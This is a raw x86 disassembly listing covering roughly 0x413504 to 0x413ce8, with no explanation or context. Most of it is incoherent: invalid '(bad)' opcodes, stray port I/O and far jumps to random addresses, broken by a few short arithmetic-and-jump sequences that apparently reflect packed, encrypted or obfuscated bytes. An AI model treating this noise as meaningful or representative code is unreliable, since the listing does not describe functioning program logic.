  413504:	ficom  WORD PTR [edx+0x105c293]
  41350a:	test   eax,eax
  41350c:	ret    0x50f3
  41350f:	push   0x35
  413511:	jle    0x413552
  413513:	push   ebp
  413514:	mov    DWORD PTR [ebp+0xe],edx
  413517:	mov    ecx,0xdc04c5b2
  41351c:	lea    ecx,ds:0x131ea655
  413522:	clc    
  413523:	xlat   BYTE PTR ds:[ebx]
  413524:	jge    0x4134d6
  413526:	add    ch,0x9b
  413529:	cld    
  41352a:	jnp    0x4134b6
  41352c:	pop    esp
  41352d:	in     eax,dx
  41352e:	gs inc esp
  413530:	sub    al,0x33
  413532:	add    eax,0x8c005065
  413537:	adc    dh,BYTE PTR [edi+0x1c]
  41353a:	jnp    0x413587
  41353c:	pop    ss
  41353d:	pop    esi
  41353e:	jae    0x413569
  413540:	mov    ch,0x26
  413542:	bound  edi,QWORD PTR [esi+0x71]
  413545:	add    BYTE PTR [edi-0x57785766],al
  41354b:	adc    DWORD PTR [edi],ebp
  41354d:	icebp  
  41354e:	stc    
  41354f:	sub    BYTE PTR [ebp-0x67],bl
  413552:	(bad)
  413556:	add    al,0x22
  413558:	pop    ds
  413559:	dec    ebx
  41355a:	mov    dh,BYTE PTR [edx+0x4a92aad1]
  413560:	inc    eax
  413561:	push   ebx
  413562:	out    0x28,al
  413564:	adc    al,0x80
  413566:	pop    ebx
  413567:	stc    
  413568:	mov    cl,bh
  41356a:	scas   eax,DWORD PTR es:[edi]
  41356b:	mov    edi,0x39d8920
  413570:	push   es
  413571:	mov    esp,0xef5012cf
  413576:	fs pop esi
  413578:	jp     0x413552
  41357a:	rol    BYTE PTR [ebx-0xa],1
  41357d:	add    bl,ch
  41357f:	popa   
  413580:	mov    ds:0x9d996f96,eax
  413585:	and    BYTE PTR [ebp+0x31],al
  413588:	ja     0x41354a
  41358a:	loop   0x413581
  41358c:	out    dx,al
  41358d:	ins    DWORD PTR es:[edi],dx
  41358e:	sbb    ecx,DWORD PTR [edi]
  413590:	adc    cl,dh
  413592:	mov    esi,0x33cdbf23
  413597:	xchg   ebx,eax
  413598:	pop    eax
  413599:	pop    eax
  41359a:	fwait
  41359b:	cmp    eax,0x4b18aeda
  4135a0:	inc    edx
  4135a1:	ror    dh,0xd8
  4135a4:	add    edx,eax
  4135a6:	cdq    
  4135a7:	cli    
  4135a8:	fbstp  TBYTE PTR [esi+0x29d9169f]
  4135ae:	pop    ss
  4135af:	mov    edi,0xf437b998
  4135b4:	int    0x99
  4135b6:	mov    al,ds:0xf1cb990b
  4135bb:	mov    al,0xac
  4135bd:	inc    eax
  4135be:	dec    edx
  4135bf:	scas   al,BYTE PTR es:[edi]
  4135c0:	in     al,0xec
  4135c2:	leave  
  4135c3:	(bad)  
  4135c4:	sti    
  4135c5:	xor    edx,ebx
  4135c7:	clc    
  4135c8:	dec    ebp
  4135c9:	shl    WORD PTR [ebx],0x50
  4135cd:	xchg   ebp,eax
  4135ce:	fild   QWORD PTR [ebp+0x1b6bed7b]
  4135d4:	jl     0x413643
  4135d6:	retf   0x59a8
  4135d9:	test   DWORD PTR [ebp-0x1d63ef53],edi
  4135df:	jecxz  0x413630
  4135e1:	and    eax,DWORD PTR [eax+0x68916bce]
  4135e7:	popa   
  4135e8:	jecxz  0x413634
  4135ea:	add    dh,BYTE PTR [esi+0x5d]
  4135ed:	add    DWORD PTR [edi],0x76c269f5
  4135f3:	sub    BYTE PTR ds:0x3cdbe1ff,dh
  4135f9:	int    0x4e
  4135fb:	fst    QWORD PTR ds:[ecx+0x28]
  4135ff:	xor    al,0x17
  413601:	xchg   edx,eax
  413602:	mov    ah,BYTE PTR [edx-0x72a06f43]
  413608:	call   0xa2bd10fa
  41360d:	cmp    esp,ecx
  41360f:	call   0xbf0c:0x46b3fbe7
  413616:	mov    dh,0x9e
  413618:	sbb    al,0x65
  41361a:	sub    al,0x62
  41361c:	inc    esi
  41361d:	test   eax,0x5dc76174
  413622:	neg    DWORD PTR [ebx-0x2047f4e8]
  413628:	inc    eax
  413629:	call   0x3f79:0x800f37ce
  413630:	mov    ds:0x74d574dd,al
  413635:	xchg   ecx,eax
  413636:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413637:	and    eax,0x16340ae5
  41363c:	mov    eax,ds:0xbff63d80
  413641:	sub    al,0xba
  413643:	xchg   ebp,eax
  413644:	xchg   edx,eax
  413645:	inc    esp
  413646:	int3   
  413647:	retf   0x8468
  41364a:	mov    WORD PTR [esp+edi*8],ss
  41364d:	jmp    0xf403:0x3e39000d
  413654:	jecxz  0x4135f6
  413656:	and    ebp,edi
  413658:	xchg   ebp,eax
  413659:	scas   eax,DWORD PTR es:[edi]
  41365a:	mov    esi,0xe651283a
  41365f:	lods   eax,DWORD PTR ds:[esi]
  413660:	je     0x4135e5
  413662:	mov    esp,0x543dc930
  413667:	fwait
  413668:	add    al,0x23
  41366a:	(bad)  
  41366b:	jmp    0x16bae3b9
  413670:	or     bl,BYTE PTR [edx+esi*1+0x4fe0cd67]
  413677:	dec    esp
  413678:	fld    QWORD PTR [esi+0x833554a]
  41367e:	mov    ch,0xe9
  413680:	ss sub eax,0x2b39b5a4
  413686:	fild   DWORD PTR [ebx-0xf9ad4a1]
  41368c:	or     DWORD PTR [eax-0x16],0xb82f8f8a
  413693:	aam    0x79
  413695:	sbb    ecx,DWORD PTR [eax]
  413697:	ins    BYTE PTR es:[edi],dx
  413698:	loope  0x4136cf
  41369a:	dec    esi
  41369b:	and    dl,0x13
  41369e:	or     eax,0x49eba80e
  4136a3:	into   
  4136a4:	xor    ah,al
  4136a6:	or     DWORD PTR [eax],esp
  4136a8:	loop   0x4136f6
  4136aa:	dec    ecx
  4136ab:	(bad)  
  4136ac:	loope  0x413668
  4136ae:	(bad)  [ecx+0x35fefb5]
  4136b4:	xchg   esi,eax
  4136b5:	ret    
  4136b6:	add    DWORD PTR [esp+edi*1-0x7ebc120f],edx
  4136bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136be:	mov    bh,0x93
  4136c0:	aad    0xde
  4136c2:	ret    0xace2
  4136c5:	fwait
  4136c6:	mov    ds:0x838cbdf5,eax
  4136cb:	fwait
  4136cc:	test   al,0x4b
  4136ce:	imul   esp,DWORD PTR [edx+ecx*1+0x2e],0xffffffb7
  4136d3:	mov    edx,DWORD PTR [ebp-0x44]
  4136d6:	mov    edi,DWORD PTR [ebp-0xc]
  4136d9:	xor    edx,eax
  4136db:	xor    edi,eax
  4136dd:	add    edx,ecx
  4136df:	add    edi,ecx
  4136e1:	jmp    0x413969
  4136e6:	ror    ecx,0xc2
  4136e9:	ror    dl,0xc7
  4136ec:	leave  
  4136ed:	leave  
  4136ee:	mov    ?,WORD PTR [ebp-0x6b088de7]
  4136f4:	mov    WORD PTR [eax+0x28],ss
  4136f7:	jge    0x413778
  4136f9:	js     0x4136e0
  4136fb:	jle    0x413775
  4136fd:	js     0x4136bb
  4136ff:	rcr    bl,1
  413701:	mov    ds:0xb8f4c45f,al
  413706:	pop    ecx
  413707:	pop    eax
  413708:	push   0xfffffffe
  41370a:	cmc    
  41370b:	fmul   QWORD PTR [edx+0x20ee6ff1]
  413711:	cld    
  413712:	arpl   cx,ax
  413714:	adc    DWORD PTR [edi+eiz*1+0x2f085550],esp
  41371b:	push   0xec2c83e9
  413720:	xor    dl,0xe2
  413723:	mov    cl,0xd9
  413725:	ins    BYTE PTR es:[edi],dx
  413726:	adc    DWORD PTR [esi-0x45],esp
  413729:	push   es
  41372a:	ret    
  41372b:	in     eax,dx
  41372c:	setge  al
  41372f:	xor    eax,0xaf163e62
  413734:	jae    0x4137a6
  413736:	sahf   
  413737:	fs jg  0x41377a
  41373a:	xor    al,0x47
  41373c:	aaa    
  41373d:	jmp    0x947e6496
  413742:	jbe    0x413761
  413744:	cwde   
  413745:	mov    ds:0xb4e6bdbb,al
  41374a:	imul   ecx,DWORD PTR [ecx],0x4a7f23fe
  413750:	xchg   ebx,eax
  413751:	test   ebx,eax
  413753:	das    
  413754:	add    eax,0x1512044a
  413759:	xchg   ebx,eax
  41375a:	in     al,0x8a
  41375c:	xchg   edx,eax
  41375d:	inc    edi
  41375e:	and    al,0x9b
  413760:	clc    
  413761:	inc    ebx
  413762:	int3   
  413763:	faddp  st(1),st
  413765:	or     ecx,DWORD PTR [ebp-0x3c5c6fcb]
  41376b:	pop    esp
  41376c:	test   DWORD PTR [ecx+0x42],edx
  41376f:	inc    eax
  413770:	ret    0xdd2d
  413773:	fbstp  TBYTE PTR [esi+edi*4-0x2113b93]
  41377a:	cmc    
  41377b:	jno    0x413766
  41377d:	idiv   BYTE PTR [edx-0x4efb3071]
  413783:	(bad)  
  413784:	cmp    al,0x2f
  413786:	jl     0x413759
  413788:	int3   
  413789:	lock inc eax
  41378b:	xor    dl,BYTE PTR [edx+0x2f1d0443]
  413791:	dec    ecx
  413792:	xor    dh,0xcd
  413795:	hlt    
  413796:	fdivp  st(0),st
  413798:	and    eax,0x4f5f2469
  41379d:	mov    ds:0x3903ed9b,eax
  4137a2:	inc    eax
  4137a3:	fdiv   DWORD PTR ss:[eax]
  4137a6:	mov    DWORD PTR [ebp-0x7ad2a177],esp
  4137ac:	add    dh,al
  4137ae:	repz mov ebx,0xb22f2f9b
  4137b4:	daa    
  4137b5:	push   ecx
  4137b6:	and    BYTE PTR [ecx-0x5376f660],dl
  4137bc:	inc    esi
  4137bd:	inc    eax
  4137be:	outs   dx,BYTE PTR ds:[esi]
  4137bf:	int3   
  4137c0:	dec    edi
  4137c1:	test   BYTE PTR [ebx+ebx*4],al
  4137c4:	loop   0x413832
  4137c6:	call   0x540d7c03
  4137cb:	push   esp
  4137cc:	xchg   edi,eax
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	dec    eax
  4137cf:	and    BYTE PTR gs:[ebp-0x6804eb51],ch
  4137d6:	add    al,0x63
  4137d8:	imul   edx,DWORD PTR [edi-0x5cb00227],0x52
  4137df:	(bad)  
  4137e0:	cli    
  4137e1:	ss cli 
  4137e3:	push   eax
  4137e4:	jns    0x413840
  4137e6:	mov    WORD PTR [edx-0x51],ss
  4137e9:	(bad)  
  4137ea:	fst    QWORD PTR [edi]
  4137ec:	outs   dx,DWORD PTR ds:[esi]
  4137ed:	adc    DWORD PTR [ecx-0x7a9c7e62],esi
  4137f3:	fdiv   st,st(1)
  4137f5:	addr16 push ebp
  4137f7:	inc    edi
  4137f8:	and    bh,BYTE PTR [ebx+0x2892f585]
  4137fe:	xor    al,0x4e
  413800:	dec    ecx
  413801:	sahf   
  413802:	jge    0x413821
  413804:	sbb    DWORD PTR [ecx-0x6d],edi
  413807:	xchg   ecx,eax
  413808:	fwait
  413809:	dec    esp
  41380a:	int    0x85
  41380c:	(bad)  
  41380d:	test   esi,0xc0080255
  413813:	mov    al,0xc6
  413815:	push   ds
  413816:	out    dx,al
  413817:	aad    0x9d
  413819:	push   es
  41381a:	or     BYTE PTR [edi],al
  41381c:	xor    BYTE PTR [ebx-0x36884b84],0xea
  413823:	pop    esi
  413824:	mov    edx,0xc807533d
  413829:	imul   eax,DWORD PTR [edx+eax*2],0xd3367dbe
  413830:	sbb    ebx,esi
  413832:	jnp    0x413897
  413834:	mov    eax,0xa2ecaa92
  413839:	sbb    ah,BYTE PTR [eax-0x66289ca9]
  41383f:	and    eax,0xab8d6b21
  413844:	stc    
  413845:	or     al,0x4b
  413847:	xchg   esp,eax
  413848:	jg     0x4138aa
  41384a:	(bad)  
  41384b:	out    0xd,al
  41384d:	mov    eax,0xadd6f539
  413852:	cmp    ah,bl
  413854:	das    
  413855:	fisttp QWORD PTR [esi+edx*8-0x262e6f0d]
  41385c:	mov    dl,0x7e
  41385e:	mov    cl,0xef
  413860:	or     BYTE PTR [esi],ah
  413862:	repnz into 
  413864:	jmp    0x5386d75d
  413869:	out    0x54,eax
  41386b:	jp     0x41380b
  41386d:	aad    0x1e
  41386f:	inc    edx
  413870:	mov    dh,BYTE PTR [ecx-0x41102796]
  413876:	add    al,BYTE PTR ds:0xa191efd3
  41387c:	push   esi
  41387d:	jnp    0x41388c
  41387f:	loopne 0x41386a
  413881:	inc    esp
  413882:	push   ds
  413883:	push   0x560e374b
  413888:	call   0xb54f9ab
  41388d:	or     edx,0xfffffff6
  413890:	inc    esp
  413891:	mov    ds:0x95e9b4f6,eax
  413896:	mov    edx,0xbd2a94bd
  41389b:	dec    esp
  41389c:	lds    esp,FWORD PTR [ebp-0x35]
  41389f:	in     eax,dx
  4138a0:	fldenv gs:[edx-0x3c81ceeb]
  4138a7:	aam    0x14
  4138a9:	xchg   BYTE PTR [ecx-0x3d43a384],dl
  4138af:	jmp    0x59b67b09
  4138b4:	adc    al,0x36
  4138b6:	dec    edx
  4138b7:	jo     0x4138ef
  4138b9:	mov    al,0xe6
  4138bb:	arpl   WORD PTR [ebx],dx
  4138bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138be:	jecxz  0x413869
  4138c0:	mov    ebp,ecx
  4138c2:	cli    
  4138c3:	cld    
  4138c4:	je     0x4138f0
  4138c6:	nop
  4138c7:	cmp    al,0xf
  4138c9:	xor    ecx,DWORD PTR [ebp-0x77]
  4138cc:	sub    ebx,DWORD PTR [esi+0x7b]
  4138cf:	dec    edx
  4138d0:	scas   eax,DWORD PTR es:[edi]
  4138d1:	xchg   ecx,eax
  4138d2:	aad    0xb4
  4138d4:	jl     0x413928
  4138d6:	adc    bl,BYTE PTR [eax]
  4138d8:	outs   dx,DWORD PTR ds:[esi]
  4138d9:	sub    DWORD PTR [eax+0x47],edx
  4138dc:	jge    0x4138f4
  4138de:	gs stc 
  4138e0:	mov    ecx,0x947b44ac
  4138e5:	cmp    BYTE PTR [edx+0x3c316358],bh
  4138eb:	cmp    edi,DWORD PTR [edi-0x26]
  4138ee:	adc    eax,0xbfd4a0f7
  4138f3:	xchg   esp,eax
  4138f4:	test   BYTE PTR [edi+0x77054c00],dh
  4138fa:	(bad)  
  4138fb:	pushf  
  4138fc:	xchg   edi,eax
  4138fd:	fld    TBYTE PTR [edi+0x4c69ab32]
  413903:	mov    bh,0xc0
  413905:	cmp    ch,bl
  413907:	pop    ds
  413908:	out    0x10,eax
  41390a:	lahf   
  41390b:	or     eax,esp
  41390d:	aaa    
  41390e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41390f:	test   DWORD PTR [edi+edx*2-0x1a],ebp
  413913:	pop    eax
  413914:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413915:	mov    ebp,0x2671f091
  41391a:	mov    eax,ds:0xadb1b058
  41391f:	jmp    0x41399e
  413921:	dec    ebx
  413922:	sbb    ebp,esp
  413924:	and    esp,DWORD PTR [ecx]
  413926:	lea    esi,[edx+0x4b]
  413929:	inc    ebp
  41392a:	mov    eax,0xf9f68132
  41392f:	add    edi,eax
  413931:	(bad)  
  413932:	mov    al,ds:0x8326374a
  413937:	sbb    ch,ah
  413939:	repz or al,dh
  41393c:	jp     0x413943
  41393e:	mov    ecx,0xc1e15091
  413943:	adc    DWORD PTR ss:[esi],esp
  413946:	fucom  st(2)
  413948:	in     al,dx
  413949:	test   DWORD PTR [edi],ebp
  41394b:	out    0x55,eax
  41394d:	je     0x4139c2
  41394f:	imul   edi,DWORD PTR [ebp-0x59],0x184ec602
  413956:	aam    0x8c
  413958:	sub    ah,dh
  41395a:	cmp    BYTE PTR [ecx+0x43534fc9],dl
  413960:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413961:	mov    DWORD PTR [edx],ecx
  413963:	add    BYTE PTR [ebp+0x1],al
  413966:	fsubr  QWORD PTR [esi]
  413968:	inc    ebp
  413969:	imul   edx,edi
  41396c:	add    edx,DWORD PTR [ebp-0x14]
  41396f:	mov    DWORD PTR [ebp-0x14],edx
  413972:	mov    edx,DWORD PTR [ebp-0xc]
  413975:	mov    edi,DWORD PTR [ebp-0x24]
  413978:	xor    edx,eax
  41397a:	add    edx,ecx
  41397c:	imul   edx,edi
  41397f:	mov    edi,DWORD PTR [ebp-0xc]
  413982:	xor    edi,eax
  413984:	jmp    0x413c0c
  413989:	enter  0xc4cf,0xca
  41398d:	retf   
  41398e:	fxch   st(6)
  413990:	fld    DWORD PTR [edx]
  413992:	xchg   edx,eax
  413993:	(bad)  
  413994:	loope  0x413a10
  413996:	adc    bh,0xdc
  413999:	xchg   ebp,eax
  41399a:	add    edi,DWORD PTR [edi+0x78]
  41399d:	in     eax,0x7e
  41399f:	js     0x413a19
  4139a1:	add    dl,BYTE PTR [ebx-0x229e8d9f]
  4139a7:	add    edx,DWORD PTR [esi]
  4139a9:	sti    
  4139aa:	mov    esp,0x526fa3d2
  4139af:	mov    ebx,DWORD PTR [edi]
  4139b1:	mov    esp,0xa1fb821d
  4139b6:	(bad)  
  4139b7:	sub    DWORD PTR [ecx+0x1a],ebx
  4139ba:	add    al,0xff
  4139bc:	leavew 
  4139be:	xlat   BYTE PTR ds:[ebx]
  4139bf:	pop    eax
  4139c0:	test   BYTE PTR ds:0x49de85f6,0x31
  4139c7:	in     al,dx
  4139c8:	rcl    eax,0xfa
  4139cb:	fist   DWORD PTR [eax-0x57013d66]
  4139d1:	push   0x5c
  4139d3:	jp     0x4139ac
  4139d5:	sbb    ah,BYTE PTR [edx-0x64e2fb91]
  4139db:	adc    edx,DWORD PTR [edx]
  4139dd:	xchg   esp,eax
  4139de:	jl     0x4139a7
  4139e0:	cmp    dh,cl
  4139e2:	cmp    bh,BYTE PTR [ebx+0xa5bf823]
  4139e8:	jp     0x4139be
  4139ea:	jecxz  0x413a63
  4139ec:	or     cl,BYTE PTR [esi]
  4139ee:	aam    0x3
  4139f0:	fild   QWORD PTR [edx+edi*1]
  4139f3:	add    DWORD PTR [esi+0x2b5cdb5e],esi
  4139f9:	xor    BYTE PTR [eax],dh
  4139fb:	push   ds
  4139fc:	jae    0x413a4a
  4139fe:	jp     0x413a43
  413a00:	xchg   edx,eax
  413a01:	imul   edx,DWORD PTR [edx-0x70305995],0xf00429b7
  413a0b:	mov    bh,0x8b
  413a0d:	jp     0x4139c0
  413a0f:	test   DWORD PTR [eax-0x5e],esp
  413a12:	addr16 mov bh,0x40
  413a15:	xor    cl,ch
  413a17:	sahf   
  413a18:	mov    esp,0x63efa23d
  413a1d:	fsubr  QWORD PTR [ebx]
  413a1f:	retf   0x38d4
  413a22:	mov    bh,0xb8
  413a24:	push   cs
  413a25:	jl     0x4139c6
  413a27:	dec    esi
  413a28:	icebp  
  413a29:	loope  0x4139d0
  413a2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a2c:	retf   0x10a2
  413a2f:	mov    edx,0xd4d8b1d3
  413a34:	leave  
  413a35:	(bad)  
  413a36:	pop    ds
  413a37:	stos   DWORD PTR es:[edi],eax
  413a38:	cmp    DWORD PTR [ecx*4+0x6910594c],0xffffff96
  413a40:	jmp    0x8f11:0x2a93c36d
  413a47:	out    dx,al
  413a48:	test   eax,0x8d9e9f50
  413a4d:	imul   eax,edx,0xcd46cd7e
  413a53:	inc    ebp
  413a54:	cmp    al,0xbf
  413a56:	retf   
  413a57:	jecxz  0x413ac0
  413a59:	test   eax,0xc92d32c6
  413a5e:	cmp    edx,DWORD PTR [edx-0x36]
  413a61:	xchg   ebp,eax
  413a62:	push   ecx
  413a63:	ins    BYTE PTR es:[edi],dx
  413a64:	(bad)  
  413a65:	pop    esi
  413a66:	add    eax,0x3e1ef389
  413a6b:	pop    es
  413a6c:	dec    eax
  413a6d:	jns    0x413a4b
  413a6f:	int    0x54
  413a71:	pop    esp
  413a72:	fucomip st,st(4)
  413a74:	jmp    0x6a4bf7bd
  413a79:	lods   al,BYTE PTR ds:[esi]
  413a7a:	push   0x12
  413a7c:	jmp    0xf4da:0x4f418148
  413a83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a84:	imul   esi,DWORD PTR [edi+0x5dad4844],0xd40ee8fd
  413a8e:	ja     0x413b02
  413a90:	div    DWORD PTR [ecx+eax*1]
  413a93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a94:	pop    es
  413a95:	lods   eax,DWORD PTR ds:[esi]
  413a96:	lea    esp,[edx+ecx*8-0x7d]
  413a9a:	adc    DWORD PTR [edx-0x3520da93],esi
  413aa0:	aas    
  413aa1:	fadd   QWORD PTR [eax]
  413aa3:	das    
  413aa4:	rcr    DWORD PTR [edx+0x5d],1
  413aa7:	pop    ebx
  413aa8:	sbb    DWORD PTR [edx-0x77],esi
  413aab:	stos   DWORD PTR es:[edi],eax
  413aac:	pop    eax
  413aad:	sub    al,0x9a
  413aaf:	test   al,0xf7
  413ab1:	adc    BYTE PTR [eax+eiz*2+0x4a514e44],ah
  413ab8:	push   es
  413ab9:	push   ebp
  413aba:	adc    dl,BYTE PTR ds:0x1367e665
  413ac0:	jmp    0x6e1c:0x8171abbf
  413ac7:	pop    ss
  413ac8:	and    BYTE PTR [ebp-0x10],cl
  413acb:	pusha  
  413acc:	adc    DWORD PTR [edx],esp
  413ace:	test   al,0x81
  413ad0:	popf   
  413ad1:	ins    DWORD PTR es:[edi],dx
  413ad2:	push   0xfffffffe
  413ad4:	pop    ebp
  413ad5:	mov    esi,0xe99161ee
  413ada:	js     0x413a85
  413adc:	daa    
  413add:	mov    bh,0xd7
  413adf:	in     al,0x48
  413ae1:	call   DWORD PTR [ebp+0x6c9971f0]
  413ae7:	sub    al,0xe3
  413ae9:	push   edi
  413aea:	fcom   DWORD PTR [esi-0x4fe0d493]
  413af0:	xchg   esp,eax
  413af1:	dec    esi
  413af2:	lods   al,BYTE PTR ds:[esi]
  413af3:	ins    BYTE PTR es:[edi],dx
  413af4:	call   0xaf0c:0xfccf3cd4
  413afb:	out    dx,eax
  413afc:	sar    BYTE PTR [edi+0x32],0x17
  413b00:	into   
  413b01:	mov    ecx,0x8bb7d5
  413b06:	jge    0x413ae3
  413b08:	addr16 xor ebx,ebx
  413b0b:	pop    es
  413b0c:	fidivr DWORD PTR [ebp+0x21]
  413b0f:	scas   al,BYTE PTR es:[edi]
  413b10:	xor    edi,esi
  413b12:	xor    BYTE PTR [edi-0x4f],ch
  413b15:	sub    dh,BYTE PTR [ebx]
  413b17:	pop    ds
  413b18:	mov    ds:0x9dc12c8,al
  413b1d:	cmp    DWORD PTR [edi-0x779a4722],esp
  413b23:	fidiv  WORD PTR [edi]
  413b25:	mov    es,edx
  413b27:	fidivr DWORD PTR [ecx+0x61]
  413b2a:	push   edx
  413b2b:	sahf   
  413b2c:	lock inc esi
  413b2e:	les    edi,FWORD PTR [eax+0xf]
  413b31:	lahf   
  413b32:	scas   al,BYTE PTR es:[edi]
  413b33:	dec    edx
  413b34:	sbb    BYTE PTR [edx-0x17b4f648],ah
  413b3a:	lea    ebx,[edi+0x3f46b2b8]
  413b40:	out    0x22,eax
  413b42:	push   ecx
  413b43:	mov    eax,0xfcda5da0
  413b48:	xor    bh,ch
  413b4a:	pop    ds
  413b4b:	scas   al,BYTE PTR es:[edi]
  413b4c:	sbb    ebx,DWORD PTR [ecx-0x622fcf1f]
  413b52:	retf   
  413b53:	inc    ebx
  413b54:	pop    ecx
  413b55:	inc    esi
  413b56:	cmp    DWORD PTR [edx],edx
  413b58:	add    DWORD PTR [esi+eiz*8-0x42],0x9fe66ff7
  413b60:	xor    bl,BYTE PTR [esi+0x3a7e78c9]
  413b66:	pusha  
  413b67:	stos   BYTE PTR es:[edi],al
  413b68:	mov    ?,WORD PTR [ecx+0x1c]
  413b6b:	mov    ecx,0x378b0f9
  413b70:	out    dx,al
  413b71:	jbe    0x413b4e
  413b73:	retf   
  413b74:	(bad)  
  413b75:	jge    0x413b9c
  413b77:	(bad)  
  413b78:	or     eax,0xd44fe62b
  413b7d:	leave  
  413b7e:	ins    DWORD PTR es:[edi],dx
  413b7f:	push   ds
  413b80:	or     edi,esp
  413b82:	out    dx,al
  413b83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b84:	out    0x5e,eax
  413b86:	call   0x7d1a:0x6310a787
  413b8d:	dec    eax
  413b8e:	jb     0x413b5b
  413b90:	mov    es,WORD PTR [ebp-0x71]
  413b93:	push   ebx
  413b94:	inc    esp
  413b95:	pop    ebx
  413b96:	cmp    esp,DWORD PTR ss:[esi]
  413b99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b9a:	mov    eax,0x7a67ea98
  413b9f:	jmp    0xc6015a38
  413ba4:	outs   dx,DWORD PTR ds:[esi]
  413ba5:	fidiv  DWORD PTR [ecx]
  413ba7:	lods   eax,DWORD PTR ds:[esi]
  413ba8:	mov    dl,0x65
  413baa:	shr    BYTE PTR [ecx-0x4aabbc1f],cl
  413bb0:	mov    ch,0xcd
  413bb2:	imul   edx,ebx,0xfeb9f3ce
  413bb8:	inc    ebx
  413bb9:	or     DWORD PTR [esi],0x95634da3
  413bbf:	mov    esi,DWORD PTR [edi]
  413bc1:	push   edi
  413bc2:	int3   
  413bc3:	mov    al,0xcd
  413bc5:	(bad)  
  413bc6:	(bad)  
  413bc8:	mov    eax,ds:0x7fcfef1c
  413bcd:	stos   BYTE PTR es:[edi],al
  413bce:	jle    0x413bd3
  413bd0:	call   0x142b:0x8984787e
  413bd7:	add    eax,0x50580b7c
  413bdc:	call   0xc805:0x547d65ea
  413be3:	and    al,0xc2
  413be5:	mov    edx,0x30ecc934
  413bea:	outs   dx,DWORD PTR ds:[esi]
  413beb:	out    dx,eax
  413bec:	sub    eax,0x12bb1857
  413bf1:	mov    esi,0x12314d25
  413bf6:	es inc edx
  413bf8:	jecxz  0x413bbe
  413bfa:	pop    edx
  413bfb:	popa   
  413bfc:	hlt    
  413bfd:	sbb    al,0x7b
  413bff:	lea    ebx,[eax]
  413c01:	repnz in eax,0x15
  413c04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c05:	xor    BYTE PTR [edi+0x28],ch
  413c08:	fs ins BYTE PTR es:[edi],dx
  413c0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c0b:	fisubr WORD PTR [ebx]
  413c0d:	xlat   BYTE PTR ds:[ebx]
  413c0e:	mov    edi,DWORD PTR [ebp-0xc]
  413c11:	mov    ebx,DWORD PTR [ebp-0x14]
  413c14:	xor    edi,eax
  413c16:	add    edi,ecx
  413c18:	jmp    0x413ea0
  413c1d:	(bad)  
  413c1e:	ror    al,cl
  413c20:	iret   
  413c21:	aam    0xd1
  413c23:	(bad)
  413c26:	ins    DWORD PTR es:[edi],dx
  413c27:	js     0x413c82
  413c29:	and    al,0x5f
  413c2b:	push   ecx
  413c2c:	inc    esp
  413c2d:	add    al,BYTE PTR [eax]
  413c2f:	jg     0x413ca9
  413c31:	in     eax,0x7e
  413c33:	js     0x413cad
  413c35:	pcmpeqd mm5,QWORD PTR [ecx]
  413c38:	out    dx,al
  413c39:	lahf   
  413c3a:	xchg   esp,eax
  413c3b:	xor    DWORD PTR [eax+eax*4-0xf6751f0],eax
  413c42:	inc    edx
  413c43:	push   edx
  413c44:	clc    
  413c45:	or     ebp,DWORD PTR [ebx-0x33050d5]
  413c4b:	iret   
  413c4c:	or     eax,0x119a3bd2
  413c51:	adc    BYTE PTR [edi+0x5dc33ff9],ch
  413c57:	enter  0x8192,0x63
  413c5b:	shr    BYTE PTR [edx],0xbb
  413c5e:	sub    eax,0x39537056
  413c63:	push   esi
  413c64:	outs   dx,BYTE PTR ds:[esi]
  413c65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c66:	add    DWORD PTR [esi],esp
  413c68:	and    al,0xaa
  413c6a:	aad    0xcf
  413c6c:	jmp    0x8354:0xea47ce3e
  413c73:	ja     0x413c98
  413c75:	cld    
  413c76:	repnz in al,0x25
  413c79:	push   edi
  413c7a:	rol    DWORD PTR [esi-0xdf2817d],0xe7
  413c81:	out    dx,al
  413c82:	mov    edx,0x855cd29b
  413c87:	sub    esi,esi
  413c89:	sub    bh,dh
  413c8b:	sub    ebp,ebp
  413c8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c8e:	mov    ecx,0xb6769b4a
  413c93:	data16 outs dx,BYTE PTR ds:[esi]
  413c95:	pop    es
  413c96:	retf   0xe1ab
  413c99:	mov    ds:0xe8bc81d,al
  413c9e:	arpl   WORD PTR [edi+eax*8],cx
  413ca1:	fnstsw WORD PTR gs:[edi+0x64]
  413ca5:	dec    edx
  413ca6:	int    0xb6
  413ca8:	mov    ah,0x91
  413caa:	sti    
  413cab:	inc    edi
  413cac:	sub    DWORD PTR [eax-0x297d59bb],ebx
  413cb2:	cld    
  413cb3:	inc    esi
  413cb4:	rol    ecx,cl
  413cb6:	push   0x914242bb
  413cbb:	sbb    dl,0x8d
  413cbe:	ss cwde 
  413cc0:	daa    
  413cc1:	jae    0x413d42
  413cc3:	or     dh,ah
  413cc5:	push   esp
  413cc6:	lahf   
  413cc7:	pop    ecx
  413cc8:	in     al,0x34
  413cca:	icebp  
  413ccb:	or     ch,bh
  413ccd:	into   
  413cce:	xchg   esi,eax
  413ccf:	sub    esp,DWORD PTR [ebx-0x9]
  413cd2:	mov    dh,0xa5
  413cd4:	lahf   
  413cd5:	in     eax,dx
  413cd6:	mov    dh,BYTE PTR [edx+esi*8]
  413cd9:	xlat   BYTE PTR ds:[ebx]
  413cda:	int3   
  413cdb:	add    DWORD PTR [edx+0x40],0xffffffd5
  413cdf:	in     eax,dx
  413ce0:	aam    0xf5
  413ce2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ce3:	pop    ebp
  413ce4:	mov    WORD PTR [edx+edx*8],cs
  413ce7:	into   
  413ce8:	pop    ebx
